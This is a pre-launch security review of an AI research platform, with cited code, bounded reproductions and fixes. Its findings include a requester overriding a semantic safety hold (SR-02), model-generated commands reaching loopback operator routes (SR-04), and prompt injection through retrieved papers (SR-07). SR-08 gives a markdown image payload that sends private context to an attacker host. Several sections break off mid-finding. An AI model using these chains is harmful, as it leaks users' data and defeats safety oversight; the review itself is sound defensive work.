# Open Co-Scientist pre-launch security and abuse review

Reviewed 2026-10-07 for anonymous public access at `https://open-coscientist.com` and publication of the repository. **Recommendation: hold unrestricted public launch until SR-01, SR-02, SR-03 and SR-05 are addressed.** SR-04 also blocks enabling generated command execution without network isolation. No critical finding was established. This review changes documentation only and does not certify the deployed service.

## Scope and revision

The executable review used commit `0f2236c32b652c95559e5206c378fa9d5de296e2`, isolated from the five implementation lanes. All source citations below are immutable links to that revision; they identify the code actually tested. The high findings' relevant implementations were also read through GitHub at `31337ea0306e85eb31dbfecc151a935aad88e952` and rechecked unchanged at `652abf5ff4acf79b2f185857e0bac05091f589db`: ownership/adjudication, continuation admission, document ingestion, scientific completion dispatch, and sandbox network policy retained the reported behavior. This is a point-in-time review, not a claim about subsequent lane fixes.

The re-architecture moves the cited `llm/` implementation to `platform/llm/`, `sandbox/` to `platform/sandbox/`, `workspace/` to `platform/sandbox/workspace/`, `core/` to `platform/core/`, and `app/app/llm_request.py` / `provider_usage.py` into `platform/llm/`. Owners should apply fixes to those current modules. The API route paths cited below remain applicable.

The root and nested `AGENTS.md`, `docs/OPERATIONS.md`, `docs/DEPLOYMENT.md`, and `docs/ARCHITECTURE.md` were read first. Setup and testing used a disposable source snapshot and synthetic local SQLite data. No production, hosting, real-user database, live provider completion, SMTP delivery, or credential-validity probe was used. Requested Sonnet parallel agents were unavailable in the exposed agent tool; no different model was substituted. Managed security-scan tools were also unavailable, so this is a source review with local tests and bounded probes.

## High findings

### SR-01 — Caller-controlled identities multiply run admission; scientific calls omit daily global quotas

**Fixing PR:** [#389 — Reapply durable global admission](https://github.com/guy915/Co-Scientist/pull/389) (lane S). The tested implementation first merged in [#383](https://github.com/guy915/Co-Scientist/pull/383); [#385](https://github.com/guy915/Co-Scientist/pull/385) reverted it after an unchanged-frontend Vercel quota failure. The owner subsequently approved backend-only deployment when Railway succeeds.

**Area:** cost abuse; denial of service. **Severity:** high. **Owner:** lane X.

**Entry and path:** A bot sends `POST /api/runs` with a new `X-Client-ID` for each group of Express runs, then starts them with `POST /api/runs/{id}/start`. The server uses the header verbatim as the principal ([app/app/auth.py:15](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/auth.py#L15)), charges free admission to that owner ([app/app/free_usage.py:60](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/free_usage.py#L60)), and counts active runs only within that owner ([app/app/store/runs.py:400](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/store/runs.py#L400)). Defaults are three free runs per day and ten active runs ([engine/src/co_scientist/core/config.py:139](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/engine/src/co_scientist/core/config.py#L139), [engine/src/co_scientist/core/config.py:110](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/engine/src/co_scientist/core/config.py#L110)); neither is a global run limit or a verified-person allowance.

Conversational completions reserve durable per-client and global daily call/token quotas ([app/app/provider_usage.py:26](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/provider_usage.py#L26), [app/app/llm_request.py:26](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/llm_request.py#L26)). Scientific engine completions call the same physical seam **without** that reservation callback ([engine/src/co_scientist/llm/request/completion.py:122](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/engine/src/co_scientist/llm/request/completion.py#L122), [engine/src/co_scientist/llm/request/transport.py:92](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/engine/src/co_scientist/llm/request/transport.py#L92)), and engine task scopes provide only the per-run budget and zero-cost admission ([app/app/engine_tasks/__init__.py:101](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/engine_tasks/__init__.py#L101)). Thus the conversational global caps do not bound all scientific calls or retries.

**Impact:** One caller can obtain arbitrarily many identity allowances, build a large runnable workload, and consume shared provider/retrieval allowances and backend resources. Default deployment routes enforce zero-price admission, so this is not evidence of automatic paid-model billing; financial exposure also depends on intentional paid routing overrides ([app/app/runs/crud.py:308](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/runs/crud.py#L308), [app/app/execution_policy.py:17](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/execution_policy.py#L17)).

**Reproduction:** With ten synthetic queued runs for one owner, starting another returned HTTP 409. Starting with a fresh owner returned HTTP 200. Direct free-ledger admission admitted three rows and blocked the fourth for each of two different identities. Forced-offline mode intentionally skips free accounting, so the free-quota result is a store-seam reproduction, not a live-provider HTTP result ([app/app/free_usage.py:31](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/free_usage.py#L31)). No provider was called to demonstrate spend.

**Fix:** Reserve a durable global run allowance and a durable global call/token allowance before every deployment-funded physical provider attempt, including research, semantic safety, verification, retries and conversational helpers. Combine that hard service budget with admission by connecting host and an issued, verified or challenged anonymous session; enforce edge controls on the origin as well as the public hostname.

### SR-02 — Run ownership grants safety-review authority

**Fixing PR:** [#395 — Require an operator token to resolve safety holds](https://github.com/guy915/Co-Scientist/pull/395) (lane S).

**Area:** auth and ownership; safety abuse. **Severity:** high. **Owner:** lane X.

**Entry and path:** An owner reads their safety decision and posts `{"resolution":"approved"}` to `POST /api/runs/{run_id}/safety/{decision_id}/adjudicate`. The route requires a nonempty client identity, records it as the reviewer, and performs no operator or independent-reviewer authorization ([app/app/runs/lifecycle.py:199](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/runs/lifecycle.py#L199), [app/app/runs/collections.py:73](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/runs/collections.py#L73)). The resolution becomes a stage approval ([app/app/store/records.py:375](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/store/records.py#L375), [app/app/store/records.py:393](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/store/records.py#L393)); approved stages skip semantic escalation ([app/app/safety/__init__.py:348](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/safety/__init__.py#L348), [app/app/safety/__init__.py:389](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/safety/__init__.py#L389)). Intake/final approval can resume paused work ([app/app/runs/lifecycle.py:159](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/runs/lifecycle.py#L159)).

**Impact:** A requester whose deterministic screen allows the text but whose semantic screen holds it can override the independent safety judgment. This does not override a deterministic hard block, and hypothesis-item adjudication has different lifecycle effects; the finding concerns requester authorization to resolve semantic review, particularly intake/final stages.

**Reproduction:** Against the offline API, an ordinary owner with no logs/admin token approved a synthetic semantic hold: HTTP 200, stage approval true, and `resolved_by` equal to that owner. The existing intake/final hold tests also approve using the owner header and subsequently complete the run ([app/tests/test_safety_hold_resume.py:111](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/tests/test_safety_hold_resume.py#L111), [app/tests/test_safety_hold_resume.py:133](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/tests/test_safety_hold_resume.py#L133)). A real semantic-model hold was not induced because provider calls were excluded.

**Fix:** Require an independently authenticated reviewer or operator capability for adjudication, separate from run ownership. Continue to enforce non-overridable deterministic prohibitions and bind approval to the reviewed content and policy version.

### SR-03 — Cheap anonymous writes have no aggregate storage or transport budget

**Fixing PR:** [#406](https://github.com/guy915/Co-Scientist/pull/406). Bounds bodies before parsing, planning/steering fields, durable ingress budgets and atomic staged/message/corpus storage; charges example-copy amplification and expires abandoned drafts. Regression tests include chunked/false lengths, identity rotation, concurrent staging, attachment copies, non-refunded admission and racing draft starts. Retention scheduling, physical volume/WAL headroom and operator recovery remain launch-runbook responsibilities.

**Area:** data; denial of service. **Severity:** high. **Owner:** lane X.

**Entry and path:** `POST /api/runs` accepts arbitrarily long goals and planning fields; steering, Q&A and start-announcement fields likewise lack maximum lengths ([app/app/runs/models.py:20](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/runs/models.py#L20), [app/app/runs/models.py:71](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/runs/models.py#L71), [app/app/runs/models.py:77](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/runs/models.py#L77), [app/app/runs/models.py:92](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/runs/models.py#L92)). The HTTP middleware does not enforce an aggregate request-byte limit before JSON/multipart parsing ([app/app/main.py:267](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/main.py#L267)). Log message truncation occurs after request-model parsing ([app/app/logs_api.py:152](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/logs_api.py#L152), [app/app/logs_api.py:198](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/logs_api.py#L198)).

An identity can also repeatedly `POST /api/documents` with `consent=true`, without creating or paying for a research run. Each accepted upload obtains another UUID and stores its full extracted text; there is no aggregate owner/global byte admission or deduplication in this path ([app/app/documents.py:32](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/documents.py#L32), [app/app/store/documents.py:26](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/store/documents.py#L26)). The 25 MiB per-file check runs after framework multipart handling and does not bound the entire request body ([app/app/document_ingest.py:90](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/document_ingest.py#L90)). Normal retention needs an explicit sweep, defaults to 90 days for terminal runs and 30 for staged documents, and does not sweep abandoned draft runs ([app/app/retention.py:13](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/retention.py#L13), [app/app/retention.py:43](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/retention.py#L43), [app/app/retention.py:59](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/retention.py#L59)).

**Impact:** A low-cost caller can fill the SQLite volume and amplify memory, serialization, WAL and writer work. Full storage affects other users' writes and recovery even without an LLM call. Per-file parser limits and bounded individual attachment text do not impose a total service storage budget ([app/app/runs/models.py:102](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/runs/models.py#L102)).

**Reproduction:** The offline API accepted a 1 MiB synthetic goal and a 1 MiB steering message with HTTP 200. The goal occupied 1,048,598 characters, with another 1,049,990-character config representation. Three identical 512 KiB document uploads each returned HTTP 200 and distinct IDs, retaining 1,572,864 text characters. These were bounded acceptance probes; the volume was not filled.

**Fix:** Enforce request bytes before buffering, maximum field/list sizes, and transactional per-session/host/global row and byte budgets for drafts, messages and uploads. Deduplicate repeated uploads, expire abandoned drafts, and schedule retention with storage-headroom alerts and a tested full-volume recovery procedure.

### SR-04 — Network-enabled generated programs cross the private-service trust boundary

**Area:** sandbox; SSRF and retrieval; auth and ownership. **Severity:** high, conditional on generated command execution being enabled. **Owner:** lane X.

**Entry and path:** An extended/ultra research run reaches a tool-enabled draft workspace. Its workspace policy explicitly enables networking ([engine/src/co_scientist/workspace/run_workspace.py:82](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/engine/src/co_scientist/workspace/run_workspace.py#L82)). The command helper denies networking only when the policy disables it, and otherwise applies filesystem and process-inspection restrictions without a destination filter ([engine/src/co_scientist/sandbox/confine_exec.py:62](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/engine/src/co_scientist/sandbox/confine_exec.py#L62), [engine/src/co_scientist/sandbox/policy.py:70](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/engine/src/co_scientist/sandbox/policy.py#L70)). A model-requested `run_command` can therefore issue an HTTP request to loopback, a link-local address or Railway private-network services; the MCP public-URL guard does not mediate that program's sockets.

The local API treats a direct loopback peer as an operator even without `X-Logs-Token` ([app/app/operator_access.py:7](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/operator_access.py#L7)), and operator log reads return the app-wide view ([app/app/logs_api.py:84](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/logs_api.py#L84), [app/app/logs_api.py:216](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/logs_api.py#L216)). Retrieval injection can encourage this chain, but an attacker-controlled run prompt is also a possible source of the tool request. Network access is not filesystem escape: it traverses a separate boundary.

**Impact:** If execution is enabled in the API's service/network namespace, untrusted programs can reach cohosted privileged API routes and private MCP tools, potentially read other users' diagnostics, and export results through public egress. Reachable services and actual loopback client addressing depend on deployment topology.

**Reproduction limit:** Local capability probing returned `None False`: neither a usable filesystem backend nor lifecycle confinement was available. Command tools are withheld in that situation ([engine/src/co_scientist/workspace/tools.py:281](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/engine/src/co_scientist/workspace/tools.py#L281)). No unconfined substitute was run and no private/prod network was contacted. The Linux Docker harness could not build its apt dependencies, so this chain remains source-verified and conditional; deployment documentation explicitly says Railway cgroup delegation is not established ([docs/DEPLOYMENT.md:96](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/docs/DEPLOYMENT.md#L96)).

**Fix:** Execute generated programs in a separate service/network namespace with default-denied loopback, private, link-local and metadata destinations and an enforced public-egress gateway. Keep command tools disabled at launch until both confinement and network-boundary tests pass; remove loopback-only operator privilege from any namespace shared with untrusted programs.

### SR-05 — Steering queues work outside normal capacity admission

**Area:** cost abuse; denial of service. **Severity:** high. **Owner:** lane X.

**Entry and path:** An owner with ten active runs posts to `POST /api/runs/{completed_id}/messages` for another completed, checkpointed run. The handler persists steering and calls `enqueue_scientist_continuation` ([app/app/runs/chat.py:40](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/runs/chat.py#L40)). That function changes the completed row to queued and enqueues an orchestrator task without the transactional capacity reservation used by start/resume ([app/app/engine_tasks/inputs.py:124](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/engine_tasks/inputs.py#L124), [app/app/runs/lifecycle.py:243](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/runs/lifecycle.py#L243)). It also does not create a fresh free-run admission record. Startup recovery launches resumable queued work separately ([app/app/main.py:90](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/main.py#L90), [app/app/main.py:130](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/main.py#L130)).

**Impact:** Completed runs become additional runnable work beyond the owner limit. Reopening is also a non-atomic status/event/task sequence, so concurrent messages can enqueue competing continuations. This does not establish unlimited LLM use: scheduler checkpoint accounting still constrains reported run calls ([engine/src/co_scientist/agents/supervisor/orchestrator.py:134](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/engine/src/co_scientist/agents/supervisor/orchestrator.py#L134)).

**Reproduction:** With ten synthetic queued rows and an additional completed row with a synthetic checkpoint, the HTTP steering request returned 200, reopened the completed row to queued, increased the owner's active count to eleven, and created a continuation task. The fixture checkpoint was not executed; immediate processing by a cohort was not claimed.

**Fix:** Route completed-run continuation through the same atomic capacity and service-budget admission as start/resume. Atomically deduplicate reopening and define a bounded, charged continuation allowance while preserving accumulated run usage.

## Medium and low findings

### SR-06 — Physical-request run ceilings are not durable

**Area:** cost abuse. **Severity:** medium. **Owner:** lane X.

**Entry and path:** Many admitted or resumed runs populate a process-local LRU of 500 counters. Eviction loses the original ceiling, and an in-flight task's next physical request recreates the entry with `ceiling=None` ([engine/src/co_scientist/llm/admission/call_budget.py:56](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/engine/src/co_scientist/llm/admission/call_budget.py#L56), [engine/src/co_scientist/llm/admission/call_budget.py:84](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/engine/src/co_scientist/llm/admission/call_budget.py#L84), [engine/src/co_scientist/llm/admission/call_budget.py:100](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/engine/src/co_scientist/llm/admission/call_budget.py#L100)). Process restart and nonterminal finalize release also remove physical counters ([app/app/engine_tasks/finalize.py:227](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/engine_tasks/finalize.py#L227)).

**Impact / evidence:** A seam probe reserved one request under a one-call ceiling, entered 500 other synthetic run scopes, and admitted the original scope's second request with no ceiling. Checkpoint metrics mitigate restart resets at scheduler boundaries, so this is a gap for physical/uncommitted attempts, not proof that every resumed run receives a fresh unlimited scheduler budget ([engine/src/co_scientist/agents/supervisor/orchestrator.py:134](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/engine/src/co_scientist/agents/supervisor/orchestrator.py#L134)).

**Fix:** Reserve physical attempts durably before dispatch and recover counters from durable reservations. Fail closed when an in-flight counter is missing; avoid evicting active enforcement state.

### SR-07 — Retrieved evidence can become instructions in tool-enabled synthesis

**Area:** prompt injection. **Severity:** medium. **Owner:** lane X.

**Entry and path:** An attacker-controlled paper or fetched web page supplies text resembling task/tool instructions. Paper content is inserted directly into an instruction-bearing analysis prompt ([engine/src/co_scientist/agents/generation/literature_review/synthesis.py:44](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/engine/src/co_scientist/agents/generation/literature_review/synthesis.py#L44), [engine/src/co_scientist/prompts/templates/literature_review_paper_analysis.md:14](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/engine/src/co_scientist/prompts/templates/literature_review_paper_analysis.md#L14)). ### SR-08 — Markdown remote images cause automatic third-party requests

**Area:** web; prompt injection. **Severity:** medium. **Owner:** lane F.

**Entry and path:** Model/report output contains an image such as `![citation](https://attacker.invalid/pixel?context=<private-fragment>)`. ### SR-09 — Parser resource limits do not bound concurrent extraction

**Area:** denial of service. **Severity:** medium. **Owner:** lane X.

**Entry and path:** Anonymous `POST /api/documents` requests launch extraction via `asyncio.to_thread` without per-host/global extraction admission ([app/app/documents.py:55](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/documents.py#L55), [app/app/document_ingest.py:90](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/document_ingest.py#L90)). ### SR-10 — SSE subscriptions have no aggregate connection admission

**Area:** denial of service. **Severity:** medium. **Owner:** lane X.

**Entry and path:** An owner opens many `GET /api/runs/{id}/events` connections against a draft/nonterminal run. Each generator polls SQLite every 0.5 seconds for up to 10,000 ticks, with no connection quota in the route ([app/app/runs/events.py:85](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/runs/events.py#L85)). Terminal/paused runs close streams, but an abandoned draft does not reach that state ([app/app/runs/events.py:17](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/runs/events.py#L17)).

**Impact / evidence:** Socket and query load scales with open connections, not with LLM admission. Twenty concurrent streams were accepted locally and `/health` still returned 200; this proves absence of low-count admission, not the load at which service degrades. The store closes read connections between polls, so persistent SQLite reader-lock starvation was not established ([app/app/store/events.py:233](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/store/events.py#L233)).

**Fix:** Bound concurrent streams globally and per session/host and share polling/broadcast work between subscribers. Close idle draft subscriptions promptly and set explicit proxy connection/idle budgets compatible with SSE.

### SR-12 — Completion mail has no verified-recipient admission

**Area:** abuse. **Severity:** medium, conditional on SMTP being configured. **Owner:** lane X.

### SR-13 — Diagnostic capture has an unbounded in-memory queue

**Area:** denial of service; data. **Severity:** medium. **Owner:** lane X.

**Entry and path:** A distributed caller creates runs that generate backend diagnostics ([app/app/store/runs.py:336](https://github.com/guy915/Co-Scientist/blob/0f2236c32b652c95559e5206c378fa9d5de296e2/app/app/store/runs.py#L336)) while other hosts submit accepted `POST /api/logs` batches. **Impact / evidence:** If backend diagnostic production exceeds the SQLite writer's drain rate, memory backlog grows; persisted-row pruning does not bound pending records. ## Blind spots and follow-through

The review did not inspect hosting settings, deployed headers, live DNS/private-network topology, provider invoices, or real-user data. It did not run live model attacks, validate credential candidates, fuzz native parsers, induce OOM/full-disk conditions, measure a botnet saturation threshold, or prove every asynchronous logging context redacts transformed secrets. Kernel confinement remained unavailable locally, and the Docker harness failed before tests. Passing mocked/offline tests cannot establish semantic-model resistance to prompt injection.

History coverage is restricted to locally reachable refs and the token patterns/text sizes scanned: remote-only/deleted refs, unreachable objects, large/binary files, generic passwords, encoded secrets and third-party browser-key restrictions require a separate publication gate. Historical captures with embedded identifiers remain an ownership/restrictions review item; they are not labeled private secrets without evidence.

Merge this documentation after its own CI passes, then have the owning lanes record fixes and regression evidence on campaign board #332. A green documentation PR does not mean the launch blockers are fixed. Re-run the affected probes against the final release revision and verify the deployment-dependent gates before opening anonymous access.
